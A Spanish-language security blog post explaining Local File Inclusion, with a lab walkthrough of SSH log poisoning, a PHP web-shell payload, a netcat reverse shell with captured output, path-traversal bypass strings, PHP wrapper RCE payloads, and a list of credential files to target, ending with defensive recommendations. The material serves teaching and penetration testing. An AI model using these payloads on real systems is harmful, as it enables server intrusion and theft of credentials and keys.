---
date: 2023-07-25T20:00:05.000Z
layout: post
comments: true
title: Local File Inclusion
subtitle: 'ejecución remota de comandos y wrappers'
description: >-
image: >-
    http://imgfz.com/i/yZDLQir.png
optimized_image: >-
    http://imgfz.com/i/yZDLQir.png
category: ciberseguridad
tags: 
  - hacking
  - owasp
  - wrappers
  - lfi
  - rfi
  - remote
  - rce
author: Felipe Canales Cayuqueo
paginate: true
---

La inclusión de archivos locales, o Local File Inclusion (LFI), es un tipo de vulnerabilidad de seguridad que permite a un atacante leer archivos del sistema de archivos del servidor. Esto puede ser explotado para proporcionar al atacante acceso a información sensible que de otro modo estaría protegida.

La vulnerabilidad LFI ocurre cuando una aplicación web utiliza la entrada del usuario para construir una ruta de archivo sin suficiente validación de entrada o sin sanitizar la entrada del usuario de manera adecuada. Por ejemplo, si una aplicación web toma un parámetro de la URL y lo usa para abrir un archivo en el servidor, un atacante podría potencialmente manipular ese parámetro para abrir cualquier archivo que desee.

## Caso práctico

Para realizar la comprobación de LFI se puede realizar lo siguiente:

[![lfi2](/images/lfi2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi2.png)

De esta manera, no solo se puede comprobar la existencia de la vulnerabilidad, sino que también se puede descubrir información sobre los usuarios del sistema.

[![lfi3](/images/lfi3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi3.png)

Si no nos permite acceder al ```/etc/passwd``` o queremos probar el acceso a otros directorios o archivos, podemos realizar un fuzzing para verificar el alcance de la siguiente forma con ```wfuzz```, ```gobuster```, entre otros:

[![lfi4](/images/lfi4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi4.png)

> Se pueden probar otros diccionarios como el de [Seclist](https://github.com/danielmiessler/SecLists).

Esto nos permite no solo visualizar alcance sino también identificar posibles directorios que permiten Remote File Inclusion (RFI).

### Remote File Inclusion (RFI)

Si el servidor está mal configurado o la aplicación es especialmente vulnerable, un atacante podría incluso ser capaz de utilizar una vulnerabilidad LFI para ejecutar código en el servidor.

En este caso se encontró el archivo ```auth.log```, el cual se usa típicamente para registrar eventos de autenticación, como inicios y cierres de sesión. Es posible por medio del puerto 22 SSH que se permita la interpretación de código que permita un RFI de la siguiente forma sin necesidad de conocer la contraseña:

```bash
┌─[root@kali]─[/home/user/lfi]
└──╼ ssh '<?php system($_GET['cmd']); ?>'@10.1.1.40  
The authenticity of host '10.1.1.40 (10.1.1.40)' can't be established.
ED25519 key fingerprint is SHA256:h+1ijitcr/kVnfc33XfHyMIJifcp2Vt9He9qc+ph1Xk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.1.1.40' (ED25519) to the list of known hosts.
<?php system($_GET[cmd]); ?>@10.1.1.40's password: 
Permission denied, please try again.
<?php system($_GET[cmd]); ?>@10.1.1.40's password: 
Permission denied, please try again.
<?php system($_GET[cmd]); ?>@10.1.1.40's password: 
<?php system($_GET[cmd]); ?>@10.1.1.40: Permission denied (publickey,password).
               
```

Una vez realizamos este proceso, podremos ejecutar comandos de la siguiente forma:

[![lfi5](/images/lfi5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi5.png)

Por medio del siguiente siguiente código en php se puede devolver una shell interactiva a nuestra máquina atacante. 

[![lfi6](/images/lfi6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi6.png)


```bash
┌─[root@kali]─[/home/user/lfi]
└──╼ nc -nlvp 443   
listening on [any] 443 ...                
```

[![lfi7](/images/lfi7.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi7.png)


```bash
┌─[root@kali]─[/home/user/lfi]
└──╼ nc -nlvp 443   
listening on [any] 443 ...
connect to [10.1.1.19] from (UNKNOWN) [10.1.1.40] 45112
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ifconfig
enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.2.11  netmask 255.255.255.0  broadcast 10.1.2.255
        inet6 fd17:625c:f037:2:3680:f705:d998:e4a0  prefixlen 64  scopeid 0x0<global>
        inet6 fd17:625c:f037:2:88c5:fc45:6c92:8fcc  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::9fbf:b0a0:b8de:8388  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:bf:db:0d  txqueuelen 1000  (Ethernet)
        RX packets 576  bytes 70357 (70.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 587  bytes 64426 (64.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s17: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.1.40  netmask 255.255.255.0  broadcast 10.1.1.255
        inet6 fd17:625c:f037:2:e57f:6313:9d59:5f34  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::e5df:32a2:43e5:9c3f  prefixlen 64  scopeid 0x20<link>
        inet6 fd17:625c:f037:2:e563:f97e:6c46:f9ba  prefixlen 64  scopeid 0x0<global>
        ether 08:00:27:bb:ab:38  txqueuelen 1000  (Ethernet)
        RX packets 1249661  bytes 196093620 (196.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1529423  bytes 580271835 (580.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5577  bytes 550401 (550.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5577  bytes 550401 (550.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

$ 
```

Finalmente obtenemos acceso al sistema por medio del archivo ```auth.log```. 

## Opciones de archivos sensibles al explotar un LFI

Recordar que estos son solo ejemplos y la ubicación y naturaleza exacta de los archivos sensibles pueden variar según el sistema y la configuración.

- `/etc/passwd`: Contiene información sobre cada cuenta de usuario en un sistema Unix o Linux.
- `/etc/shadow`: En sistemas Unix y Linux, este archivo contiene las contraseñas cifradas de los usuarios.
- `/var/log/auth.log`: Archivo de registro de autenticación en muchos sistemas basados en Unix.
- `/etc/hosts`: Puede contener asignaciones personalizadas de nombres de host a direcciones IP.
- `/etc/apache2/apache2.conf` y otros archivos de configuración del servidor web: Pueden revelar información sobre la configuración del servidor web.
- `.htaccess`, `wp-config.php`, y otros archivos de configuración de aplicaciones web: Pueden contener información sensible como contraseñas de bases de datos.
- `~/.ssh/id_rsa`: Este archivo contiene la clave privada de RSA para la autenticación SSH de un usuario.
- `~/.ssh/authorized_keys`: Este archivo puede contener una lista de claves públicas que se permiten autenticar en el sistema.
- Archivos de configuración de la base de datos, como `my.cnf` para MySQL: Estos pueden contener credenciales de base de datos o detalles de la configuración.

## Wrappers

En el contexto de la programación, un "wrapper" o envoltorio es un tipo de función, método o clase que contiene (o "envuelve") un conjunto de instrucciones o un objeto con el objetivo de agregar alguna funcionalidad adicional, ocultar la complejidad o cambiar la interfaz de lo que está envolviendo. En PHP, un "wrapper" puede ser utilizado para indicar el tipo de protocolo que se debe usar para acceder a un archivo o recurso. Por ejemplo, puedes tener "http://" o "ftp://" como wrappers en las rutas de los archivos.

### Ejemplo en base64

```
php://filter/convert.base64-encode/resource=<archivo>

php://filter/read=convert.base64-encode/resource=<archivo>
```

[![lfi1](/images/lfi1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi1.png)

Algunas veces en el payload no es necesario agregar su extensión por ejemplo .php.

## Bypass de filtros

```
....//....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
/..././..././..././..././..././..././..././..././etc/passwd

```

### RCE con Wrappers

Una forma de ejecutar código en los servidores back-end y obtener control sobre ellos es por medio de wrappers. Algunos payloads son los siguientes:

#### data

```
echo '<?php system($_GET["cmd"]); ?>' | base64

data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

#### expect

```
expect://id
```

#### input

Este caso se debe realizar por el método POST por lo que varía un poco, se muestra a continuación un ejemplo de como se aplica.

```
php://input&cmd=ls


por POST -> '<?php system($_GET["cmd"]); ?>'
```

[![lfi8](/images/lfi8.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi8.png)

## Recomendaciones

1. **Validación de la entrada**: La entrada del usuario siempre debe tratarse con sospecha. Nunca deberías usar la entrada del usuario directamente en funciones que trabajan con el sistema de archivos sin validarla primero. La validación debe asegurar que la entrada es segura y está dentro de los parámetros esperados.

2. **Limitación del directorio**: Cuando sea posible, limita la inclusión de archivos a un directorio específico y niega el acceso a cualquier otro directorio. Esto puede limitar el alcance de cualquier vulnerabilidad de LFI.

3. **Desactiva la inclusión de archivos remotos**: En PHP, esto puede hacerse configurando `allow_url_include = Off` en el archivo `php.ini`. Esto puede prevenir la inclusión de archivos remotos, lo que puede ser un vector de ataque adicional cuando una vulnerabilidad de LFI está presente.

4. **Uso de listas blancas para la inclusión de archivos**: Si necesitas permitir la inclusión de archivos en función de la entrada del usuario, considera el uso de una lista blanca de archivos permitidos en lugar de depender de la validación de la entrada.

5. **Uso de funciones menos peligrosas**: En lugar de usar funciones como `include` o `require` en PHP, considera el uso de funciones que son intrínsecamente menos peligrosas, como `readfile` o `file_get_contents`, cuando sea apropiado.
